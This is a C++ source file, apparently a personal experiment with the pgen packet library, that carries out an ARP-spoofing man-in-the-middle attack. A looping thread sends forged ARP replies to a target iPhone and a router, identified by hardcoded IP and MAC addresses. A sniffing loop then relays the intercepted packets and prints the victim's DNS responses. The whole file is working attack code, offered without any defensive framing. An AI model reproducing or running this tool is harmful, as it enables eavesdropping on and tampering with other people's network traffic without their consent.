#include <stdio.h>
#include <pgen.h>
#include <thread>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>


const char* dev = "wlan1";
const char* myip = "192.168.179.8";

/* buffalo router */
//const char* router_ip = "192.168.222.1";
//const char* router_mac = "74:03:bd:13:2c:a6";

/* nad11 mobile router */
const char* router_ip = "192.168.179.1";
const char* router_mac = "a2:12:42:17:d8:8f";

/* iphone */
const char* target_ip = "192.168.179.4";
const char* target_mac = "f0:24:75:bf:8d:bf";

/* buffalo usb ethernetl */
//const char* target_ip = "192.168.222.106";
//const char* target_mac = "80:e6:50:17:18:46";

/* mac wlan en0 */
//const char* target_ip = "192.168.222.103";
//const char* target_mac = "cc:e1:d5:02:ea:71";


pgen_t* handle;
void mitm_attack(const char* ip1, const char* mac1, 
					const char* ip2, const char* mac2);
bool filter(const u_char* packet, int len);



void filter_dns(const u_char* packet, int len){
	pgen_unknown buf(packet, len);
	if(buf.isUDP && buf.portis(53)){
		pgen_dns dns(packet, len);
		if(dns.DNS.flags.qr==1){
			dns.summary();	
		}
	}
}


bool myswitch(const u_char* packet, int len){
	if(filter(packet, len) == false) return true;
	
	filter_dns(packet, len);

	macaddr next_src;
	macaddr next_dst;
	next_src.setmacbydev(dev);
	pgen_ip ip(packet, len);
	
	if(ip.IP.dst == target_ip)	next_dst = target_mac;
	else						next_dst = router_mac;
	ip.ETH.src = next_src;
	ip.ETH.dst = next_dst;
	
	ip.send_handle(handle);
	return true;
}





int main(int argc, char** argv){
	handle = pgen_open(dev, NULL);
	if(handle == NULL){
		perror("pgen_open");
		return -1;
	}
	std::thread mitm(mitm_attack, target_ip, target_mac, router_ip, router_mac);
	sniff(handle, myswitch);
}



bool filter(const u_char* packet, int len){
	ipaddr myip;
	myip.setipbydev(dev);

	pgen_unknown buf(packet, len);
	if(buf.isIP == false)	return false;
	if(buf.ipaddris(myip)) return false;

	return true;	
}



void mitm_attack(const char* ip1, const char* mac1, 
					const char* ip2, const char* mac2){
	pgen_arp pack_to_target1;
	pgen_arp pack_to_target2;

	pack_to_target1.ETH.src.setmacbydev(dev);
	pack_to_target1.ETH.dst = mac1;
	pack_to_target1.ARP.srcEth.setmacbydev(dev);
	pack_to_target1.ARP.srcIp  = ip2;
	pack_to_target1.ARP.dstEth = mac1;
	pack_to_target1.ARP.dstIp  = ip1;
	pack_to_target1.ARP.operation = 2;
	pack_to_target2.ETH.src.setmacbydev(dev);
	pack_to_target2.ETH.dst = mac2;
	pack_to_target2.ARP.srcEth.setmacbydev(dev);
	pack_to_target2.ARP.srcIp  = ip1;
	pack_to_target2.ARP.dstEth = mac2;
	pack_to_target2.ARP.dstIp  = ip2;
	pack_to_target2.ARP.operation = 2;

	for(int i=0; ; i++){
		pack_to_target1.send(dev);
		pack_to_target2.send(dev);
		sleep(1);
	}		
}
